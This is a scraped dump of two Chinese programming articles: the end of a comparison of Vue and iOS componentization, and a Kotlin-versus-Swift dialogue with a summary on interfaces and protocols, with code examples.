<p>浏览器从服务器加载初始页面，以及整个应用所需的脚本（框架、库、应用代码）和样式表。当用户定位到其他页面时，不会触发页面刷新。通过 HTML5 History API 更新页面的 URL 。浏览器通过 AJAX 请求检索新页面（通常以 JSON 格式）所需的新数据。然后， SPA 通过 JavaScript 动态更新已经在初始页面加载中已经下载好的新页面。这种模式类似于原生手机应用的工作原理。</p>
<p>但是 iOS 开发更像类 MPA (Multi-Page Application)。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010122357"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>往往一个原生的 App ，页面差不多应该是上图这样。当然，可能有人会说，依旧可以把这么多页面写成一个页面，在一个 VC 里面控制所有的 View，就像前端的 DOM 那样。这种思路虽然理论上是可行的，但是笔者没有见过有人这么做，页面一多起来，100多个页面，上千个 View，都在一个 VC 上控制，这样开发有点蛋疼。</p>
<h3>两者解决的需求也存在差异</h3>
<p>iOS 的组件化一部分也是解决了代码复用性的问题，但是更多的是解决耦合性大，开发效率合作性低的问题。而 Vue 的组件化更多的是为了解决代码复用性的问题。</p>
<h3>两者的组件化的方向也有不同。</h3>
<p>iOS 平台由于有 UIKit 这类苹果已经封装好的 Framework，所以基础控件已经封装完成，不需要我们自己手动封装了，所以 iOS 的组件着眼于一个大的功能，比如网络库，购物车，我的钱包，整个业务块。前端的页面布局是在 DOM 上进行的，只有最基础的 CSS 的标签，所以控件都需要自己写，Vue 的组件化封装的可复用的单文件组件其实更加类似于 iOS 这边的 ViewModel。</p>
<p>所以从封装性上来讲，两者可以相互借鉴的地方并不多。iOS 能从前端借鉴的东西在状态管理这一块，单向数据流的思想。不过这一块思想虽然好，但是如何能在自家公司的app上得到比较好的实践，依旧是仁者见仁智者见智的事了，并不是所有的业务都适合单向数据流。</p>
<hr>
<p>Reference：  <br><a href=""https://cn.vuejs.org/"" rel=""nofollow noreferrer"">Vue.js 官方文档</a></p>
<blockquote>
<p>GitHub Repo：<a href=""https://github.com/halfrost/Halfrost-Field"" rel=""nofollow noreferrer"">Halfrost-Field</a></p>
<p>Follow: <a href=""https://github.com/halfrost"" rel=""nofollow noreferrer"">halfrost · GitHub</a></p>
<p>Source: <a href=""https://halfrost.com/vue_ios_modularization/"" rel=""nofollow noreferrer"">https://halfrost.com/vue_ios_modularization/</a></p>
</blockquote>

                ", 大话大前端时代(一) —— Vue 与 iOS 的组件化,1531971946,472,1,594,1,1,https://segmentfault.com/a/1190000010122331
54,1,0,6,"
                    
<p>Kotlin 君和 Swift 君在一个团队一起开发已经很久了，由于平台的差异性，他们经常会进行一些技术上的交流（PK），「Kotlin vs. Swift」 系列就是他们在互相切磋时的语录。内容会由简及深，慢慢深入。</p>
<h2>技术漫谈</h2>
<p><strong>Swift:</strong></p>
<p>Hi, Kotlin 君, Swift 4 发布了，我们今天就基于 Swift 4 的新语法来讨论一下接口吧？</p>
<p><strong>Kotlin:</strong></p>
<p>好啊，接口对我们开发来说是个很重要的概念。设计模式中要求我们写代码要遵循依赖倒置原则，就是程序要依赖于抽象接口，不要依赖于具体实现，也就是要求我们要面向接口编程。</p>
<p><strong>Swift:</strong></p>
<p>是的，在 Swift 中，接口被称为协议（即 <code>Protocol</code> ）, 苹果大大强化了 <code>Protocol</code> 在这门语言中的地位，整个 Swift 标准库也是基于 <code>Protocol</code> 来设计的，可以说 Swift 是一门面向 <code>protocol</code> 编程的语言。</p>
<p><strong>Kotlin:</strong></p>
<p>听起来好流比，那来说说你们是怎么定义接口的？</p>
<p><strong>Swift:</strong></p>
<p>我们用 <code>Protocol</code> 关键字来定义接口：</p>
<pre><code class=""swift"">protocol SomeProtocol {
    func f()
}</code></pre>
<p>你们呢？</p>
<p><strong>Kotlin:</strong></p>
<p>我们同 Java 一样，用 <code>interface</code> 关键字来定义接口：</p>
<pre><code class=""kotlin"">interface MyInterface {
    fun f()
}</code></pre>
<p><strong>Swift:</strong></p>
<p>嗯，看起来就是关键字不一样。你们怎么实现接口呢？</p>
<p><strong>Kotlin:</strong></p>
<p>一个类要实现某个接口，需要在类型名称后加上协议名称，中间以冒号（<code>:</code>）分隔：</p>
<pre><code class=""kotlin"">class MyClass: MyInterface {
    override fun f() {
       // 具体实现
    }
}</code></pre>
<p>一个类或者对象可以实现一个或多个接口。实现多个接口时，各接口之间用逗号（<code>,</code>）分隔.</p>
<p><strong>Swift:</strong></p>
<p>我们也是一样的，只是我们不需要写 <code>override</code> 关键字，只有当子类复写父类的方法或计算属性时才需要用 <code>override</code> 修饰。另外，我们还可以通过扩展类型来实现协议：</p>
<pre><code class=""swift"">class MyClass {
    //...类的定义
}

extension MyClass: SomeProtocol {
    func f() {
        // 具体实现
    }
}</code></pre>
<p><strong>Kotlin:</strong></p>
<p>? ，这意味着你们不用修改原有类型，就可以让原有类型符合某个协议了，甚至可以扩展标准库中的某个基础类型来实现自定义的协议。这很符合开闭原则嘛。</p>
<p><strong>Swift:</strong></p>
<p>是啊，牛不牛 ?。</p>
<p>我们实现协议的类型除了 <code>class</code> 外，还可以是 <code>struct</code> 或 <code>enum</code>。</p>
<p><strong>Kotlin:</strong></p>
<p>Kotlin 没有结构体的概念， <code>enum</code> 也可以实现接口。</p>
<p>来说说你们的接口中可以声明哪些东西吧？</p>
<p><strong>Swift:</strong></p>
<p>我们可以在协议中声明属性和方法，用 <code>var</code> 关键字来声明变量属性，并在属性声明后加上 <code>{ set get }</code> 来表示属性是可读可写的，用 <code>{ get }</code> 来表示属性是只读的。</p>
<p>协议里面声明的属性和方法一定是抽象的，不能有实现，由符合协议的类型来提供所有属性和方法的实现。</p>
<p><strong>Kotlin:</strong></p>
<p>我们也可以声明属性和方法，而且 Kotlin 可以直接在接口中为属性和方法提供默认实现：</p>
<pre><code class=""kotlin"">interface MyInterface {
    val prop: Int // 抽象的
    val propertyWithImplementation: String
        get() = ""foo""

    fun foo() {
        print(prop)
    }
}

class MyClass : MyInterface {
    override val prop: Int = 29
}</code></pre>
<p><strong>Swift:</strong></p>
<p>?，虽然我们不能在协议中直接提供属性和方法的默认实现，但是我们可以通过协议扩展来达到此目的。</p>
<pre><code class=""swift"">protocol MyProtocol {
    var prop: Int { get set }
    var propertyWithImplementation: String { get }
    func foo()
}

extension MyProtocol {
    var propertyWithImplementation: String {
        return ""foo""
    }
    
    func foo() {
        print(prop)
    }
}

class MyClass: MyProtocol {
    var prop: Int = 29
}
</code></pre>
<p><strong>Kotlin:</strong></p>
<p>哇~，你们这个协议扩展有点厉害了。</p>
<p><strong>Swift:</strong></p>
<p>是的，正是这个特性，才使得我们面向协议编程成为可能。我们甚至可以在扩展中添加协议里没有定义过的方法和属性。</p>
<pre><code class=""swift"">extension MyProtocol {
    func isExceed() -&gt; Bool {
        return prop &gt; 30
    }
}
let instance = MyClass()
print(instance.isExceed())
// false</code></pre>
<p><strong>Kotlin:</strong></p>
<p>?，这就意味着你们也有能力扩展标准库里的协议了，可以很方便的给标准库里的协议添加新的方法和属性。</p>
<p><strong>Swift:</strong></p>
<p>聪明，确实是这样。不仅如此，在扩展协议的时候，还可以指定一些限制条件，只有遵循协议的类型满足这些限制条件时，才能获得协议扩展提供的默认实现。</p>
<pre><code class=""swift"">protocol TextRepresentable {
    var textualDescription: String { get }
}

struct Hamster: TextRepresentable {
    var name: String
    var textualDescription: String {
        return ""A hamster named \(name)""
    }
}

extension Collection where Iterator.Element: TextRepresentable {
    var textualDescription: String {
        let itemsAsText = self.map { $0.textualDescription }
        return ""["" + itemsAsText.joined(separator: "", "") + ""]""
    }
}

let hamsters = [Hamster(name: ""Jim""), Hamster(name: ""Merry"")]
print(hamsters.textualDescription)
// [A hamster named Jim, A hamster named Merry]</code></pre>
<p>这里扩展了 Swift 标准库中的 <code>Collection</code> 协议，但是限制只适用于集合中的元素遵循了 <code>TextRepresentable</code> 协议的情况。 因为 <code>Swift</code> 中 <code>Array</code> 符合 <code>Collection</code> 协议，而 <code>Hamster</code> 类型又符合 <code>TextRepresentable</code> 协议，所以 <code>hamsters</code> 可以使用 <code>textualDescription</code> 属性得到数组内容的文本表示。</p>
<p><strong>Kotlin:</strong></p>
<p>赞啊~，你们这个协议扩展太强大了，不仅可以扩展自己定义的协议，还可以扩展标准库中的协议，怪不得苹果称 <code>Swift</code> 是面向协议编程的语言。</p>
<p>Swift 在实现多个协议时，会不会有不同协议带来同名方法或属性的冲突的问题？</p>
<p><strong>Swift:</strong></p>
<p>我们还不能很好地处理多个协议的冲突问题。?</p>
<p><strong>Kotlin:</strong></p>
<p>? Kotlin 可以，Kotlin 有一套规则来处理这样的冲突。在 Kotlin 中，如果一个类从它的直接超类继承相同成员的多个实现（由于接口函数可以有实现），它必须覆盖这个成员并提供其自己的实现。 为了表示采用从哪个超类型继承的实现，我们使用由尖括号中超类型名限定的 super，如 super<a>。</a></p>
<pre><code class=""kotlin"">open class A {
    open fun f() { print(""A"") }
    fun a() { print(""a"") }
}

interface B {
    fun f() { print(""B"") } // interface members are 'open' by default
    fun b() { print(""b"") }
}

class C() : A(), B {
    // The compiler requires f() to be overridden:
    override fun f() {
        super&lt;A&gt;.f() // call to A.f()
        super&lt;B&gt;.f() // call to B.f()
    }
}</code></pre>
<p><strong>Swift:</strong></p>
<p>这个好赞，可以不怕名字冲突了 ?。</p>
<p>Kotlin 的接口中可以声明类方法吗？</p>
<p><strong>Kotlin:</strong></p>
<p>Kotlin 里面已经没有类方法的概念了。</p>
<p><strong>Swift:</strong></p>
<p>我们可以在协议中使用 <code>static</code> 关键字来声明类型方法，如果实现该协议的类型是 <code>class</code> 类型，则在实现类中除了用 <code>static</code> 来修饰类型方法外，也可以使用 <code>class</code>关键字.</p>
<pre><code class=""swift"">protocol SomeProtocol {
    static func someTypeMethod()
}

class SomeClass: SomeProtocol {
    // 这里也可以用 static 修饰，区别是 static 修饰的属性
    // 或方法不能被子类复写，class 修饰的可以被子类复写
    class func someTypeMethod() {
        print(""type method"")
    }
}</code></pre>
<p><strong>Kotlin:</strong></p>
<p>我们的接口虽然不支持类方法，但是我们可以给接口中定义的方法的参数设置默认值。</p>
<p><strong>Swift:</strong></p>
<p>这。。。我们不支持为协议中的方法的参数提供默认值。?</p>
<p><strong>Kotlin:</strong></p>
<p>?，方法参数的默认值必须定义在接口中，在实现类或对象实现该方法时，不能为函数提供默认值。同时接口的中函数不能用 <code>JVMOverride</code> 注解修饰，所以接口中定义的带有默认值的参数，不能为 Java 生成重载方法，如果接口是定义在库里面，Kotlin 的实现也无法使用自动重载功能，需要手动重载。</p>
<pre><code class=""kotlin"">interface IDownload{
    fun(url: String, isSupportBreakpointC: Boolean = true)
}

class DownloadImpl: IDownload{
    override fun(url: String, isSupportBreakpointC: Boolean){
        
    }
}</code></pre>
<p><strong>Swift:</strong></p>
<p>?，这点算你强。</p>
<p>我们的协议中可以定义可变方法，如果协议中定义的实例方法会改变遵循该协议的类型的实例，那么需要在该方法前加 <code>mutating</code> 关键字, 表示可以在该方法中修改它所属的实例以及实例的任意属性的值, 例如：</p>
<pre><code class=""swift"">protocol Togglable {
    mutating func toggle()
}

enum OnOffSwitch: Togglable {
    case off, on
    mutating func toggle() {
        switch self {
        case .off:
            self = .on
        case .on:
            self = .off
        }
    }
}
var lightSwitch = OnOffSwitch.off
lightSwitch.toggle()
// lightSwitch 现在的值为 .On</code></pre>
<p><strong>Kotlin:</strong></p>
<p>? 我们没这特性，这点你赢了。</p>
<p><strong>Swift:</strong></p>
<p>岂止如此，我们的协议中还可以要求遵循协议的类型实现指定的构造器：</p>
<pre><code class=""swift"">protocol SomeProtocol {
    init(someParameter: Int)
}

class SomeClass: SomeProtocol {
    required init(someParameter: Int) {
        // initializer implementation goes here
    }
}</code></pre>
<p>在符合协议的类中实现构造器，必须在构造器实现前加上 <code>required</code> 修饰符。使用 <code>required</code> 修饰符可以确保所有子类也必须提供此构造器实现，从而也能符合协议。 如果类已经被标记为 <code>final</code>，那么不需要在协议构造器的实现中使用 <code>required</code> 修饰符，因为 <code>final</code> 类不能有子类.</p>
<p>协议还可以为遵循协议的类型定义可失败构造器。</p>
<p><strong>Kotlin:</strong></p>
<p>好吧，我们不可以在接口中声明构造器。</p>
<p><strong>Swift:</strong></p>
<p>?，你们的接口可以继承吗？</p>
<p>Swift 中协议能够继承一个或多个其他协议，可以在继承的协议的基础上增加新的要求.</p>
<p><strong>Kotlin:</strong></p>
<p>当然可以，这是基本的用法好伐。</p>
<p><strong>Swift:</strong></p>
<p>好吧。。我们还可以通过让协议继承 <code>AnyObject</code> 协议来限制协议只能被 <code>Class</code> 类型遵循，而结构体或枚举不能遵循该协议。</p>
<p><strong>Kotlin:</strong></p>
<p>我们并没有这种限制，接口可以被类和枚举实现。</p>
<p><strong>Swift:</strong></p>
<p>你们的接口可以组合吗？</p>
<p>Swift 可以采用 <code>&amp;</code> 符号将多个协议进行组合：</p>
<pre><code class=""swift"">protocol Named {
    var name: String { get }
}
protocol Aged {
    var age: Int { get }
}
struct Person: Named, Aged {
    var name: String
    var age: Int
}
func wishHappyBirthday(to celebrator: Named &amp; Aged) {
    print(""Happy birthday, \(celebrator.name), you're \(celebrator.age)!"")
}
let birthdayPerson = Person(name: ""Malcolm"", age: 21)
wishHappyBirthday(to: birthdayPerson)
// Prints ""Happy birthday, Malcolm, you're 21!""</code></pre>
<p>这里 <code>wishHappyBirthday(to:)</code> 函数的参数类型为 <code>Named &amp; Aged</code>, 这意味着它不关心参数的具体类型，只要参数符合这两个协议即可。当然也可以给组合的协议指定一个别名：<code>typealias Property = Named &amp; Aged</code></p>
<p><strong>Kotlin:</strong></p>
<p>666，你们的协议真是玩出花了，这个功能我们也没有?。</p>
<p><strong>Swift:</strong> </p>
<p>除了协议与协议组合外，协议还可以与类进行组合：</p>
<pre><code class=""swift"">class Location {
    var latitude: Double
    var longitude: Double
    init(latitude: Double, longitude: Double) {
        self.latitude = latitude
        self.longitude = longitude
    }
}
class City: Location, Named {
    var name: String
    init(name: String, latitude: Double, longitude: Double) {
        self.name = name
        super.init(latitude: latitude, longitude: longitude)
    }
}
func beginConcert(in location: Location &amp; Named) {
    print(""Hello, \(location.name)!"")
}
 
let seattle = City(name: ""Seattle"", latitude: 47.6, longitude: -122.3)
beginConcert(in: seattle)</code></pre>
<p>这里的 <code>beginConcert(in:)</code> 函数的参数要求是 <code>Location</code> 的子类，且必须符合 <code>Named</code> 协议.</p>
<p><strong>Kotlin:</strong></p>
<p>太赞了~，给你点32个赞?！</p>
<p><strong>Swift:</strong></p>
<p>你们是怎么判断某个实例是否符合某个协议的？</p>
<p><strong>Kotlin:</strong></p>
<p>这就是判断某个对象是否是某个类型嘛，当然是用 <code>is</code> 啦，如果是类型转换的话用 <code>as</code> 。</p>
<p><strong>Swift:</strong></p>
<p>嗯嗯，这点我们是一致的。</p>
<p>你们可以定义接口中的方法或属性为可选吗？</p>
<p><strong>Kotlin:</strong></p>
<p>何谓可选？</p>
<p><strong>Swift:</strong></p>
<p>就是可以实现也可以不实现</p>
<p><strong>Kotlin:</strong></p>
<p>前面讲过了啊，如果接口中的属性或方法在实现类中可以实现也可以不实现，则可以在接口定义中为该方法提供默认实现。</p>
<p><strong>Swift:</strong></p>
<p>嗯，Swift 是通过协议扩展提供默认实现来到达可选的目的。</p>
<p>不过 Swift 也可以像 <code>Objective-C</code> 里那样定义可选的接口方法，就需要在 <code>protocol</code> 定义之前加上 <code>@objc</code>，将 <code>protocol</code> 变为 <code>Objective-C</code> 的。然后使用 <code>optional</code> 关键字来声明某些方法或属性在符合该协议的类中可以不实现，如下：</p>
<pre><code>@objc protocol CounterDataSource {
    @objc optional func incrementForCount(count: Int) -&gt; Int
    @objc optional var fixedIncrement: Int { get }
}</code></pre>
<p>需要注意的是，标记为 <code>@objc</code> 的 <code>protocol</code> 只能被 <code>class</code> 实现，不能被 <code>struct</code> 和 <code>enum</code> 类型实现，而且实现它的 <code>class</code> 中的方法也必须被标注为 <code>@objc</code>，或者整个类就是继承自 <code>NSObject</code>。</p>
<p><strong>Kotlin:</strong></p>
<p>额。。。这岂不是很蛋疼</p>
<p><strong>Swift:</strong></p>
<p>?，是的，所以这种方式并不提倡。</p>
<p><code>Swift</code> 可以使用 <code>Protocol</code> 来实现委托（代理）模式，委托（代理）模式允许类或结构体将一些需要它们负责的功能委托给其他类型的实例，如下：</p>
<pre><code>protocol RentHouserDelegate{
    func rent(_ name:String);
}

class Tenant {
    var name = ""lucy""
    var delegate: RentHouserDelegate?
    func rentHouse(){
        delegate?.rent(name)
    }
}

class Intermediary: RentHouserDelegate {
    var name=""lily""
    func rent(_ name:String) {
        print(""\(name) 请 \(self.name) 帮她租一套房子"");
    }
}

var person = Tenant();
person.delegate = Intermediary()
person.rentHouse()
// lucy 请 lily 帮她租一套房子</code></pre>
<p><strong>Kotlin:</strong></p>
<p>这是接口的一种常用方法，我们依赖注入框架就大量使用这种方式。</p>
<p><strong>Swift:</strong></p>
<p>哈哈，英雄所见略同。</p>
<p>好了，就到这吧，今天的PK互有攻防，好带劲?~</p>
<p><strong>Kotlin:</strong></p>
<p>?，总体来说还是你们的协议比较强大。</p>
<p><strong>Swift:</strong></p>
<p>那是，要不然苹果怎么敢称 Swift 是一门面向协议编程的语言呢</p>
<p><strong>Kotlin:</strong></p>
<p>好吧，咱们来日方长。</p>
<p><strong>Swift:</strong></p>
<p>嗯嗯，后会有期。</p>
<h2>知识点总结</h2>
<h3>Kotlin</h3>
<h4>接口定义</h4>
<p>同 Java 一样，Kotlin 用 <code>interface</code> 关键字来定义接口，Kotlin 接口中可以有函数的实现，也可以只有抽象方法，接口无法保存状态，它可以有属性但必须声明为抽象或提供访问器实现。</p>
<pre><code class=""kotlin"">interface MyInterface {
    fun bar()
    fun foo() {
      // 可选的方法体
    }
}</code></pre>
<h4>实现接口</h4>
<p>Kotlin 的一个类或者对象可以实现一个或多个接口。由于 Kotlin 接口本身的函数式可以有实现的，所以在一个类或对象实现多个接口的时候，就有可能发生冲突，这包括接口之间的的成员冲突，也包括接口与父类直接的成员冲突。</p>
<h4>覆盖冲突</h4>
<p>在 Kotlin 中，如果一个类从它的直接超类继承相同成员的多个实现（由于接口函数可以有实现），它必须覆盖这个成员并提供其自己的实现。 为了表示采用从哪个超类型继承的实现，我们使用由尖括号中超类型名限定的 super，如 super&lt;Base&gt;。</p>
<pre><code class=""kotlin"">open class A {
    open fun f() { print(""A"") }
    fun a() { print(""a"") }
}

interface B {
    fun f() { print(""B"") } // interface members are 'open' by default
    fun b() { print(""b"") }
}

class C() : A(), B {
    // The compiler requires f() to be overridden:
    override fun f() {
        super&lt;A&gt;.f() // call to A.f()
        super&lt;B&gt;.f() // call to B.f()
    }
}</code></pre>
<p>同时继承 A 和 B 没问题，并且 a() 和 b() 也没问题因为 C 只继承了每个函数的一个实现。 但是 f() 由 C 继承了两个实现，所以我们必须在 C 中覆盖 f() 并且提供我们自己的实现来消除歧义。</p>
<h4>接口中的属性</h4>
<p>Kotlin 中可以在接口中定义属性。在接口中声明的属性要么是抽象的，要么提供访问器的实现。在接口中声明的属性不能有幕后字段（backing field），因此接口中声明的访问器不能引用它们。</p>
<pre><code class=""kotlin"">interface MyInterface {
    val prop: Int // 抽象的

    val propertyWithImplementation: String
        get() = ""foo""

    fun foo() {
        print(prop)
    }
}

class Child : MyInterface {
    override val prop: Int = 29
}</code></pre>
<h4>函数默认参数与重载</h4>
<p>如果接口函数需要定义默认值的话，必须定义在接口中，在实现类或对象实现该方法时，不能为函数提供默认值。同时接口的中函数不能用 <code>JVMOverride</code> 注解修饰，所以接口中定义的带有默认值的参数，不能为 Java 生成重载方法，如果接口是定义在库里面，Kotlin 的实现也无法使用自动重载功能，需要手动重载。</p>
<pre><code>interface IDownload{
    fun(url: String, isSupportBreakpointC: Boolean = true)
}

class DownloadImpl{
    override fun(url: String, isSupportBreakpointC: Boolean){
        
    }
}</code></pre>
<h3>Swift</h3>
<h4>Protocol</h4>
<p><code>Swift</code> 是一门支持面向协议编程的语言，在 <code>Swift</code> 语言中，协议被赋予了更多的功能和更广阔的使用空间。恰逢苹果发布了 <code>swift 4</code>，以下都是基于最新的 <code>swift 4</code> 语法进行讲述。</p>
<h4>协议语法</h4>
<p>协议声明：</p>
<pre><code>protocol SomeProtocol {
    // protocol definition goes here
}</code></pre>
<p>要让自定义类型符合某个协议，需要在类型名称后加上协议名称，中间以冒号（<code>:</code>）分隔。符合多个协议时，各协议之间用逗号（<code>,</code>）分隔. <code>swift</code> 中，符合协议的类型可以是 <code>class</code>、<code>struct</code> 或 <code>enum</code>。</p>
<pre><code>struct SomeStructure: FirstProtocol, AnotherProtocol {
    // structure definition goes here
}</code></pre>
<p>需要注意的是，如果某个类在符合某个协议的同时又继承自某个父类，应将其父类名放在其符合的协议名之前。</p>
<h4>协议属性声明</h4>
<p>协议中可以声明符合此协议的类型必须实现的属性：</p>
<pre><code>protocol SomeProtocol {
    var mustBeSettable: Int { get set }
    var doesNotNeedToBeSettable: Int { get }
}</code></pre>
<p>协议不指定属性是存储型属性还是计算型属性，它只指定属性的名称和类型，以及属性是可读的还是可读可写的。</p>
<p>协议总是用 <code>var</code> 关键字来声明变量属性，在类型声明后加上 <code>{ set get }</code> 来表示属性是可读可写的，用 <code>{ get }</code> 来表示属性是只读的。</p>
<p>协议中总是使用 <code>static</code> 关键字定义类型属性，如果是 <code>class</code>类型实现协议，除了 <code>static</code>，还可以使用 <code>class</code> 关键字来声明类型属性。</p>
<pre><code>protocol AnotherProtocol {
    static var someTypeProperty: Int { get }
}

class SomeClass: AnotherProtocol {
    // 这里也可以用 static 修饰，区别是 static 修饰的属性
    或方法不能被子类复写，class 修饰的可以被子类复写
    class var someTypeProperty: Int {
        return 0
    }
}</code></pre>
<h4>协议方法声明</h4>
<p>协议可以要求遵循协议的类型实现某些指定的实例方法或类方法。需要注意的是，不支持为协议中的方法的参数提供默认值。</p>
<pre><code>protocol RandomNumberGenerator {
    func random() -&gt; Double
}</code></pre>
<p>与属性类似，在协议中也使用 <code>static</code> 定义类方法，当 <code>class</code> 类型实现协议时，可以使用 <code>class</code> 关键字来修饰.</p>
<p>如果协议中定义的实例方法会改变遵循该协议的类型的实例，那么需要在该方法前加 <code>mutating</code> 关键字, 表示可以在该方法中修改它所属的实例以及实例的任意属性的值, 例如：</p>
<pre><code>protocol Togglable {
    mutating func toggle()
}

enum OnOffSwitch: Togglable {
    case off, on
    mutating func toggle() {
        switch self {
        case .off:
            self = .on
        case .on:
            self = .off
        }
    }
}
var lightSwitch = OnOffSwitch.off
lightSwitch.toggle()
// lightSwitch 现在的值为 .On</code></pre>
<h4>协议构造器声明</h4>
<p>协议可以要求遵循协议的类型实现指定的构造器：</p>
<pre><code>protocol SomeProtocol {
    init(someParameter: Int)
}

class SomeClass: SomeProtocol {
    required init(someParameter: Int) {
        // initializer implementation goes here
    }
}</code></pre>
<p>在符合协议的类中实现构造器，必须在构造器实现前加上 <code>required</code> 修饰符。使用 <code>required</code> 修饰符可以确保所有子类也必须提供此构造器实现，从而也能符合协议. 如果类已经被标记为 <code>final</code>，那么不需要在协议构造器的实现中使用 <code>required</code> 修饰符，因为 <code>final</code> 类不能有子类.</p>
<p>协议还可以为遵循协议的类型定义可失败构造器。</p>
<h4>委托（代理）模式</h4>
<p><code>Swift</code> 可以使用 <code>Protocol</code> 来实现委托（代理）模式，委托（代理）模式允许类或结构体将一些需要它们负责的功能委托给其他类型的实例，如下：</p>
<pre><code>protocol RentHouserDelegate{
    func rent(_ name:String);
}

class Tenant {
    var name = ""lucy""
    var delegate: RentHouserDelegate?
    func rentHouse(){
        delegate?.rent(name)
    }
}

class Intermediary: RentHouserDelegate {
    var name=""lily""
    func rent(_ name:String) {
        print(""\(name) 请 \(self.name) 帮她租一套房子"");
    }
}

var person = Tenant();
person.delegate = Intermediary()
person.rentHouse()
// lucy 请 lily 帮她租一套房子</code></pre>
<h4>通过扩展遵循协议</h4>
<p>可以通过扩展令已有类型遵循并符合协议：</p>
<pre><code>protocol TextRepresentable {
    var textualDescription: String { get }
}

struct Circular {
    var radius: Int
}

extension Circular: TextRepresentable {
    var textualDescription: String {
        return ""The circular's radius is \(radius)""
    }
}

let circular = Circular(radius: 2)
print(circular.textualDescription)
// The circular's radius is 2</code></pre>
<p>当一个类型已经符合了某个协议中的所有要求，却还没有声明遵循该协议时，可以通过空扩展来使该类型遵循该协议:</p>
<pre><code>struct Square {
    var width: Int
    var textualDescription: String {
        return ""The square's width is \(width)""
    }
}
extension Square: TextRepresentable {}

let square = Square(width: 3)
let squareTextRepresentable: TextRepresentable = square
print(squareTextRepresentable.textualDescription)
// The square's width is 3</code></pre>
<h4>协议类型</h4>
<p>尽管协议本身并未实现任何功能，但是协议可以被当做一个成熟的类型来使用。<br>协议类型也可以在数组或者字典这样的集合中使用：</p>
<pre><code>let things: [TextRepresentable] = [circular, square]
for thing in things {
    print(thing.textualDescription)
}</code></pre>
<h4>协议的继承</h4>
<p>协议能够继承一个或多个其他协议，可以在继承的协议的基础上增加新的要求：</p>
<pre><code>protocol PrettyTextRepresentable: TextRepresentable {
    var prettyTextualDescription: String { get }
}

extension Square: PrettyTextRepresentable {
    var prettyTextualDescription: String {
        var output = textualDescription + "": ""
        output += ""the area is \(width*width)""
        return output
    }
}

print(square.prettyTextualDescription)
// The square's width is 3: the area is 9</code></pre>
<h4>Class 类型专属协议</h4>
<p>通过让协议继承 <code>AnyObject</code> 协议来限制协议只能被 <code>Class</code> 类型遵循，而结构体或枚举不能遵循该协议</p>
<pre><code>protocol SomeClassOnlyProtocol: AnyObject, SomeInheritedProtocol {
    // class-only protocol definition goes here
}</code></pre>
<h4>协议合成</h4>
<p>可以采用 <code>&amp;</code> 符号将多个协议进行组合：</p>
<pre><code>protocol Named {
    var name: String { get }
}
protocol Aged {
    var age: Int { get }
}
struct Person: Named, Aged {
    var name: String
    var age: Int
}
func wishHappyBirthday(to celebrator: Named &amp; Aged) {
    print(""Happy birthday, \(celebrator.name), you're \(celebrator.age)!"")
}
let birthdayPerson = Person(name: ""Malcolm"", age: 21)
wishHappyBirthday(to: birthdayPerson)
// Prints ""Happy birthday, Malcolm, you're 21!""</code></pre>
<p>这里 <code>wishHappyBirthday(to:)</code> 函数的参数类型为 <code>Named &amp; Aged</code>, 这意味着它不关心参数的具体类型，只要参数符合这两个协议即可。当然也可以给组合的协议指定一个别名：<code>typealias Property = Named &amp; Aged</code></p>
<p>除了协议与协议组合外，协议还可以与 <code>class</code> 进行组合：</p>
<pre><code>class Location {
    var latitude: Double
    var longitude: Double
    init(latitude: Double, longitude: Double) {
        self.latitude = latitude
        self.longitude = longitude
    }
}
class City: Location, Named {
    var name: String
    init(name: String, latitude: Double, longitude: Double) {
        self.name = name
        super.init(latitude: latitude, longitude: longitude)
    }
}
func beginConcert(in location: Location &amp; Named) {
    print(""Hello, \(location.name)!"")
}
 
let seattle = City(name: ""Seattle"", latitude: 47.6, longitude: -122.3)
beginConcert(in: seattle)</code></pre>
<p>这里的 <code>beginConcert(in:)</code> 函数的参数要求是 <code>Location</code> 的子类，且必须符合 <code>Named</code> 协议.</p>
<h4>检查协议一致性</h4>
<p>可以通过 <code>is</code> <code>as?</code> <code>as</code> 来检查某个实例是否符合某个协议：</p>
<pre><code>let things: [Any] = [circular, square, ""abc""]
for thing in things {
    if let object = thing as? TextRepresentable {
        print(object.textualDescription)
    } else {
        print(""It does not conform to TextRepresentable"")
    }
}</code></pre>
<h4>可选协议</h4>
<p>原生的 <code>Swift protocol</code> 里没有可选项，所有定义的方法都是必须实现的。如果想要像 <code>Objective-C</code> 里那样定义可选的接口方法，就需要在 <code>protocol</code> 定义之前加上 <code>@objc</code>，将 <code>protocol</code> 变为 <code>Objective-C</code> 的。然后使用 <code>optional</code> 关键字来声明某些方法或属性在符合该协议的类中可以不实现，如下：</p>
<pre><code>@objc protocol CounterDataSource {
    @objc optional func incrementForCount(count: Int) -&gt; Int
    @objc optional var fixedIncrement: Int { get }
}</code></pre>
<p>需要注意的是，标记为 <code>@objc</code> 的 <code>protocol</code> 只能被 <code>class</code> 实现，不能被 <code>struct</code> 和 <code>enum</code> 类型实现，而且实现它的 <code>class</code> 中的方法还必须也被标注为 <code>@objc</code>，或者整个类就是继承自 <code>NSObject</code>。这还是很蛋疼的。</p>
<h4>协议扩展</h4>
<p>协议可以通过扩展来为遵循协议的类型提供属性和方法的实现，即使协议中没有声明。这样就无需在每个遵循协议的类型中都重复同样的实现，也无需使用全局函数。</p>
<pre><code>protocol TextRepresentable {
    var textualDescription: String { get }
}

extension TextRepresentable {
    func hasDescription() -&gt; Bool {
        return !textualDescription.isEmpty
    }
}</code></pre>
<p>还可以通过协议扩展来为协议要求的属性、方法提供默认的实现。这样在遵循这个协议的类型中，可以不用实现这个属性或方法，调用的时候默认调 <code>extension</code> 中的实现。这也相当于变相将 <code>protocol</code> 中的属性或方法设定为了 <code>`optional</code>.</p>
<pre><code>extension TextRepresentable {
    var textualDescription: String {
        return ""This is a shape""
    }
}</code></pre>
<p>在扩展协议的时候，也可以指定一些限制条件，只有遵循协议的类型满足这些限制条件时，才能获得协议扩展提供的默认实现。</p>
<pre><code>extension Collection where Iterator.Element: TextRepresentable {
    var textualDescription: String {
        let itemsAsText = self.map { $0.textualDescription }
        return ""["" + itemsAsText.joined(separator: "", "") + ""]""
    }
}

let circulars = [Circular(radius: 1), Circular(radius: 2)]
print(circulars.textualDescription)
// [The circular's radius is 1, The circular's radius is 2]</code></pre>
